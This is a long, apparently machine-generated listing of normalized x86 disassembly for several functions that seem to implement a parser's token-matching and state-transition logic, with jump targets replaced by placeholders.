je r-xdata
mov esi [ ebp + 0x8 ]
push 0x0
mov eax 0x8
mov ecx esi
call sub_1006d050
mov edx [ esi + 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax ] 0x2
mov ecx [ esi + 0xc ]
pop ebx
pop edi
mov [ ecx + 0x34 ] 0x1
mov eax 0x1
pop esi
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x1
push 0x0
mov eax esi
call sub_1006c810
add esp 0x18
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi esi
call sub_1006d010
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebx + 0xc ]
pop ebx
pop edi
mov [ edx ] 0x2
mov eax 0x1
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006c750
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001bee0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1006e910
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
test eax eax
jne r-xdata
push ebx
cmp eax 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006c750
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
mov esi 0x1
cmp eax esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov ecx [ edx + 0x68 ]
push ecx
push eax
call sub_1001bee0
add esp 0x8
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_1006cce0
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_1006cce0
lea eax [ ebx + 0x1 ]
pop ebx
pop edi
pop esi
pop ebp
retn
cmp eax 0x2
jne r-xdata
xor ecx ecx
cmp [ edi + 0x18 ] esi
sete cl
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
push esi
mov eax 0x8
mov ecx edi
call sub_1006d050
mov ecx [ edi + 0xc ]
mov [ ecx ] 0x3
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx + 0x2c ] eax
mov eax [ edi + 0xc ]
pop ebx
mov [ eax + 0x34 ] esi
pop edi
mov eax esi
pop esi
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push esi
push 0x0
mov eax edi
call sub_1006c810
add esp 0x18
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006d010
mov edx [ ebx + 0xc ]
mov [ edx ] 0x3
mov ecx [ ebx + 0xc ]
pop ebx
mov [ ecx + 0x2c ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006c750
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001bee0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1006ea50
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0xc ]
mov ebx [ edi ]
cmp ebx 0x4
jne r-xdata
push esi
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_1006d1b0
pop edi
lea eax [ ebx - 0x3 ]
pop ebx
pop ebp
retn
cmp ebx 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006c750
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0xc
pop esi
pop edi
xor eax eax
pop ebx
pop ebp
retn
mov esi 0x1
cmp ebx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
push 0x96
push 0x4
push 0x7b
push 0x7e
push 0x8b
push 0x3
push esi
mov eax edi
call sub_1006c810
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
cmp [ edi + 0x18 ] eax
sete al
test eax eax
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_1006cce0
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
mov esi edi
mov ebx edx
call sub_1006cce0
pop esi
pop edi
lea eax [ ebx + 0x1 ]
pop ebx
pop ebp
retn
cmp ebx esi
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006d010
mov eax ebx
call sub_1006cc00
mov eax [ ebx + 0xc ]
mov [ eax + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_1006ed80
add esp 0x8
pop esi
pop edi
pop ebx
pop ebp
retn
push 0x96
push 0x6
push 0x82
push esi
mov eax edi
call sub_1006c810
add esp 0x10
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x5
sete cl
test ecx ecx
je r-xdata
cmp ebx esi
jne r-xdata
push 0x4
jmp r-xdata
xor edx edx
cmp eax 0x2
sete dl
mov eax edx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006d010
mov eax ebx
call sub_1006cc00
mov ecx [ ebx + 0xc ]
mov [ ecx + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
cmp ebx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x8
sete cl
test ecx ecx
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax edi
call sub_1006d210
add esp 0x4
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
push 0x2
jmp r-xdata
cmp ebx esi
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] esi
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x7
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006d010
mov eax [ ebx + 0xc ]
mov [ eax ] 0x4
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
cmp ebx 0x2
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] esi
sete al
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_1006cc00
mov edx [ edi + 0xc ]
mov eax esi
pop esi
pop edi
mov [ edx ] 0x5
pop ebx
pop ebp
retn
push 0x5
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_1006cc00
mov edx [ edi + 0xc ]
mov [ edx ] 0x5
mov eax [ edi + 0xc ]
mov [ eax + 0x34 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x0
mov eax edi
call sub_1006c810
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov eax edi
call sub_1006c750
add esp 0x4
pop esi
pop edi
xor eax eax
pop ebx
pop ebp
retn
sub_1006ec80
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x5
ja r-xdata
push esi
push edi
call sub_10030ff0
add esp 0x8
pop edi
pop esi
pop ebp
retn
push ebx
jmp [ eax * 4 + jump_table_1006ed68 ]
xor ebx ebx
cmp [ esi + 0x14 ] ebx
jbe r-xdata
xor ebx ebx
cmp [ esi + 0x50 ] ebx
jbe r-xdata
mov eax [ esi + 0x10 ]
push eax
mov edx [ esi + 0x10 ]
push edx
push edi
call sub_10030ff0
mov eax [ esi + 0x20 ]
push eax
push edi
call sub_10030ff0
mov ecx [ esi + 0x24 ]
push ecx
push edi
call sub_10030ff0
mov edx [ esi + 0x28 ]
push edx
push edi
call sub_10030ff0
add esp 0x20
pop ebx
push esi
push edi
call sub_10030ff0
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_1006ec80
inc ebx
add esp 0x8
cmp ebx [ esi + 0x14 ]
jb r-xdata
mov edx [ esi + 0x4c ]
push edx
push edi
call sub_10030ff0
xor ebx ebx
add esp 0x8
cmp [ esi + 0x14 ] ebx
jbe r-xdata
lea esp [ esp ]
mov edx [ esi + 0x10 ]
push edx
jmp r-xdata
lea ebx [ ebx ]
mov eax [ esi + 0x4c ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_10044fc0
inc ebx
add esp 0x8
cmp ebx [ esi + 0x50 ]
jb r-xdata
push edi
call sub_10030ff0
add esp 0x8
pop ebx
mov eax [ esi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_1006ec80
inc ebx
add esp 0x8
cmp ebx [ esi + 0x14 ]
jb r-xdata
sub_1006ed80
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi + 0xc ]
mov [ ebp - 0x4 ] edi
cmp eax 0x6
je r-xdata
push esi
mov eax ebx
call sub_1006c750
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0xc
cmp eax 0x4
jne r-xdata
cmp eax 0x5
jne r-xdata
push esi
call sub_1006d390
add esp 0x4
mov edi ebx
mov eax esi
call sub_1006d1b0
cmp eax 0x3
jne r-xdata
push esi
call sub_1006d390
mov edi ebx
mov eax esi
call sub_1006d1b0
push r--data
call sub_1001f980
mov edx [ esi + 0xc ]
add esp 0x8
pop edi
pop esi
mov [ edx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov eax ebx
call sub_1006c750
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_1006cce0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx + eax * 4 - 0x4 ]
push 0x96
push 0x2
push 0x6
push 0x7
push 0x82
push 0x5
push 0x4
push 0x7b
push 0x7e
push 0x8b
push 0x3
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x30
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] eax
sete al
test eax eax
je r-xdata
mov edx [ ebx ]
cmp edx 0x1
jne r-xdata
push ebx
push esi
call sub_1006ea50
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006c750
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
push esi
mov edi ebx
call sub_1006de00
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp edx 0x7
jne r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0xa
sete cl
test ecx ecx
je r-xdata
push 0x96
push 0x0
push 0xa
push 0x0
mov eax ebx
call sub_1006c810
add esp 0x10
test eax eax
je r-xdata
cmp [ edi + 0xc ] 0x0
mov [ ebp + 0x8 ] 0x0
jbe r-xdata
xor ecx ecx
cmp eax 0x81
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_1006c750
add esp 0x4
cmp [ edi + 0xc ] 0x2
jb r-xdata
push 0x96
push 0x1e
push 0x79
push 0xc
push 0x19
push 0x1d
push 0xd
push 0x7a
push 0x15
push 0x16
push 0x17
push 0x23
push 0x24
push 0x6a
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x8e
push 0x1c
push 0xe
push 0xb
push 0x18
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x60
test eax eax
je r-xdata
push esi
mov eax 0xa
call sub_1006d690
add esp 0x4
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
mov edi [ eax + 0x8 ]
push esi
mov eax ebx
call sub_1006c750
add esp 0x4
cmp [ edi + 0xc ] 0x2
jb r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx + 0x4 ]
push 0xa
call sub_1006c8b0
add esp 0x4
test eax eax
je r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x20
test eax eax
je r-xdata
push ebx
call sub_1006dcf0
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_1006d010
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi + 0xc ] 0x0
mov [ ebp + 0xc ] 0x1
mov [ ebp + 0x8 ] 0x0
jbe r-xdata
push esi
mov eax ebx
call sub_1006c750
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
inc eax
add edi 0x4
mov [ ebp + 0x8 ] eax
cmp eax [ edx + 0xc ]
jb r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_1001bee0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx edi
mov edx [ ebx + 0x8 ]
mov edi [ edx + 0x4 ]
push 0xa
mov eax edi
call sub_1006c8b0
add esp 0x4
test eax eax
je r-xdata
mov edx edi
mov [ edx + 0x3c ] 0x0
mov eax [ ecx + 0x4 ]
push esi
mov edi ebx
call sub_1006de00
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x84
push 0x1b
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x10
test eax eax
je r-xdata
push ebx
call sub_1006dcf0
add esp 0x4
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
mov [ ebp + 0x8 ] eax
push 0x10
push 0xf
mov eax esi
call sub_1006c550
push eax
call sub_1006c860
add esp 0x20
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
mov [ edx ] 0x12
cmp [ ebx ] 0x2
jne r-xdata
mov edx edi
mov edi [ edx + 0x8 ]
mov edi edi
push 0x96
push 0x0
mov ecx [ edi ]
push 0xa
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x19
push 0x1f
push 0x21
push 0x22
push ecx
call sub_1006c860
add esp 0x38
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x3c ] 0x0
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
push ebx
call sub_1006dcf0
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_1006d010
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0x40 ] 0x1
mov [ eax + 0x3c ] 0x0
mov eax [ ebp + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
mov ebx esi
call sub_1006d010
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006c750
add esp 0x4
mov eax esi
call sub_1006cc00
mov ecx [ edi + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov eax [ edi + 0x68 ]
add ecx 0x10
call sub_1006cbc0
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
cmp [ ebx + 0x18 ] eax
sete al
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_1006c750
mov edi [ ebp - 0x4 ]
add esp 0x4
mov [ ebp + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
inc eax
add edi 0x4
mov [ ebp + 0x8 ] eax
cmp eax [ ecx + 0xc ]
jb r-xdata
lea esp [ esp ]
push 0x96
push 0x21
push 0x22
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x69
sete cl
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
pop edi
pop esi
mov [ eax + 0x34 ] 0x1
mov eax [ ebp + 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x0
push 0xa
push 0x66
push 0x64
push 0x68
mov eax [ edi ]
push 0x65
push 0x67
push 0x63
push 0x3d
push 0x3e
push 0x19
push 0x72
push 0x71
push 0x1f
push 0x21
push 0x22
push eax
call sub_1006c860
add esp 0x48
test eax eax
je r-xdata
mov edi ecx
jmp r-xdata
mov eax esi
call sub_1006cc00
mov ecx [ ebx + 0x8 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov ebx esi
call sub_1006d4a0
mov edx [ ebx + 0x4 ]
mov ecx [ edx + 0x4 ]
mov edx [ ecx + 0x14 ]
add ecx 0x10
xor eax eax
test edx edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
push 0x0
jmp r-xdata
xor edx edx
cmp eax 0x1f
sete dl
mov eax edx
test eax eax
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
push edi
push ebx
call sub_1006ec80
mov edi [ ebp + 0xc ]
add esp 0x8
call sub_1006d010
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0x13
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ecx ]
lea ebx [ ebx ]
push 0x96
push 0x1e
push 0x79
push 0xc
push 0x1b
push 0x1d
push 0xd
push 0x7a
push 0x84
push 0x15
push 0x16
push 0x17
push 0x23
push 0x24
push 0x6a
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x8e
push 0x6e
push 0x1c
push 0xe
push 0xb
push 0x18
push 0x0
mov eax ebx
call sub_1006c810
add esp 0x68
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x88
sete cl
test ecx ecx
je r-xdata
push ebx
push esi
call sub_1006dd70
push ebx
call sub_1006dcf0
mov edi ebx
add esp 0x10
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_1006d010
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push ebx
call sub_1006dcf0
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_1006d010
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov [ ecx + 0x30 ] eax
mov eax [ ebp + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
push r--data
call sub_1001f980
push esi
mov eax ebx
call sub_1006c750
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001bee0
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push ecx
push eax
push ebx
call sub_10015200
add esp 0xc
inc eax
add esi 0x4
cmp eax edx
jb r-xdata
cmp [ ebx ] 0x2
jne r-xdata
mov eax [ ebx + 0x18 ]
push esi
call sub_1006d690
add esp 0x4
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x6e
sete cl
mov eax ecx
test eax eax
je r-xdata
push ebx
call sub_1006dcf0
mov edi ebx
mov ebx esi
mov [ ebp + 0xc ] eax
call sub_1006d010
mov eax ebx
push 0x6
push eax
call sub_100620b0
mov eax [ ebp + 0xc ]
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi ] edi
je r-xdata
jmp r-xdata
push 0x96
push 0x21
push 0x22
push 0x0
mov eax ebx
call sub_1006c810
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x69
sete cl
test ecx ecx
je r-xdata
mov eax [ ebx + 0x18 ]
push ebx
mov ecx esi
call sub_1006dc70
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax 0x6e
call sub_1006d690
add esp 0x4
push esi
test eax eax
je r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x0
mov eax ebx
call sub_1006c810
add esp 0x20
test eax eax
je r-xdata
mov edi [ ebx + 0x18 ]
push esi
mov eax edi
call sub_1006d690
add esp 0x4
test eax eax
jne r-xdata
xor ecx ecx
cmp eax 0x19
sete cl
test ecx ecx
je r-xdata
mov eax [ edi + 0x30 ]
mov [ ebp - 0x10 ] 0x1
mov [ edi + 0x30 ] 0x0
test eax eax
je r-xdata
call sub_1006d390
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006d010
mov edx [ ebp - 0x4 ]
pop edi
pop esi
mov [ edx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_1006c750
push ebx
mov eax 0x6e
mov ecx esi
call sub_1006dc70
add esp 0x8
mov [ edi + 0x34 ] 0x1
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x1
jne r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push esi
call sub_1006d760
add esp 0x20
test eax eax
je r-xdata
push ebx
mov eax edi
mov ecx esi
call sub_1006dc70
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006c750
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp eax 0x1f
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
mov eax 0x19
call sub_1006d850
add esp 0x4
test eax eax
jne r-xdata
push r--data
call sub_1001f980
push esi
mov eax ebx
call sub_1006c750
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001bee0
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
mov eax esi
call sub_1006d6f0
test eax eax
je r-xdata
push 0x96
push 0x3a
push 0x94
push 0x29
push 0x8a
push 0x2a
push 0x2b
push 0x38
push 0x8f
push 0x28
push 0x32
push 0x8c
push 0x39
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x38
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x27
sete al
test eax eax
je r-xdata
mov edi 0x96
call sub_1006d930
mov edx [ ebx + 0x18 ]
push edx
mov eax esi
call sub_1006c550
call sub_1006c8b0
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
push esi
mov eax 0x1f
call sub_1006d7f0
add esp 0x4
test eax eax
je r-xdata
push ebx
mov eax 0x19
mov ecx esi
call sub_1006dc70
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006c750
push esi
call sub_1006d390
push 0x19
mov eax 0x10
mov ecx esi
call sub_1006d050
add esp 0xc
mov [ edi + 0x34 ] 0x1
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0xc ]
mov edi 0x96
call sub_1006d930
mov eax esi
call sub_1006c550
cmp eax ebx
je r-xdata
mov edi [ ebx ]
cmp edi 0x1
jne r-xdata
push esi
call sub_1006d390
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006d010
mov ebx eax
mov edi esi
call sub_1006d320
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp + 0xc ]
push eax
mov eax esi
mov [ ebp - 0x4 ] 0x1
call sub_1006d270
add esp 0x4
test eax eax
je r-xdata
mov eax esi
call sub_1006cc00
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push eax
call sub_1006c860
add esp 0x20
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_1006c750
add esp 0x4
push ebx
mov eax 0x1f
mov ecx esi
call sub_1006dc70
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
push esi
call sub_1006c750
add esp 0x4
xor edi edi
jmp r-xdata
push 0x96
push 0x3a
push 0x94
push 0x29
push 0x8a
push 0x2a
push 0x2b
push 0x92
push 0x38
push 0x8f
push 0x28
push 0x32
push 0x8c
push 0x39
push 0x27
push 0x0
mov eax ebx
call sub_1006c810
add esp 0x40
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x92
sete al
test eax eax
je r-xdata
push esi
call sub_1006d390
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006d010
mov ebx eax
mov edi esi
call sub_1006d320
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006c750
push 0x27
push ebx
push esi
call sub_1006e1a0
lea ecx [ ebp + 0xc ]
push ecx
mov eax esi
call sub_1006d270
add esp 0x14
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edx
push eax
push esi
call sub_10015200
add esp 0xc
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edx ]
lea ecx [ ecx + eax * 4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
add edx 0x8
dec eax
js r-xdata
push 0x96
push 0x4a
push 0x90
push 0x7c
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebx + 0x18 ]
push ecx
push ebx
push esi
call sub_1006e1a0
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov [ ebp + 0xc ] edi
call sub_1006d390
push esi
mov eax 0x92
call sub_1006d690
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
lea edx [ edi + 0x14 ]
push edx
push eax
push esi
call sub_10015200
add edi 0x8
push edi
push eax
push esi
call sub_10038c10
add esp 0x18
sub ecx 0x4
dec eax
jns r-xdata
push 0x96
push 0x4a
push 0x90
push 0x7c
push 0x0
mov eax ebx
call sub_1006c810
add esp 0x14
test eax eax
je r-xdata
push esi
call sub_1006d390
mov edi ebx
mov ebx esi
call sub_1006d010
mov ebx r--data
mov edi esi
call sub_1006d320
push edi
call sub_1006c450
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
mov ebx esi
call sub_1006d010
mov edi ebx
mov eax edi
call sub_1006c550
mov ebx eax
call sub_1006d320
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
mov [ ebp + 0xc ] 0x0
call sub_1006c750
push 0x92
push ebx
push esi
call sub_1006e1a0
push esi
call sub_1006d390
add esp 0x14
cmp [ ecx ] ebx
je r-xdata
cmp edi 0x1
jne r-xdata
mov edi [ ebx + 0x18 ]
push esi
mov eax edi
call sub_1006d8b0
add esp 0x4
test eax eax
je r-xdata
push 0x96
push 0x43
push 0x74
push 0x46
push 0x47
push 0x49
push 0x42
push 0x52
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x24
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x5f
sete al
test eax eax
je r-xdata
push ebx
mov eax edi
mov ecx esi
call sub_1006dc70
add esp 0x4
mov ebx esi
call sub_1006d4a0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0x1
cmp edi 0x1
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
cmp [ edx + 0x2c ] edi
je r-xdata
push 0x96
push 0x4f
push 0x4e
push 0x4b
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x6d
sete al
test eax eax
je r-xdata
push esi
call sub_1006d390
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006d010
mov esi eax
mov eax edi
cmp [ eax ] 0x1
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x46
sete al
test eax eax
je r-xdata
mov edi ebx
mov ebx esi
call sub_1006d010
push esi
call sub_1006c450
mov eax [ esi + 0xc ]
add esp 0x4
pop edi
pop esi
mov [ eax ] 0x8
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call sub_1006dcf0
add esp 0x4
cmp edi 0x1
jne r-xdata
mov edi ebx
mov ebx esi
call sub_1006d010
mov eax esi
call sub_1006cc00
mov ecx [ esi + 0xc ]
pop edi
mov eax 0x1
pop esi
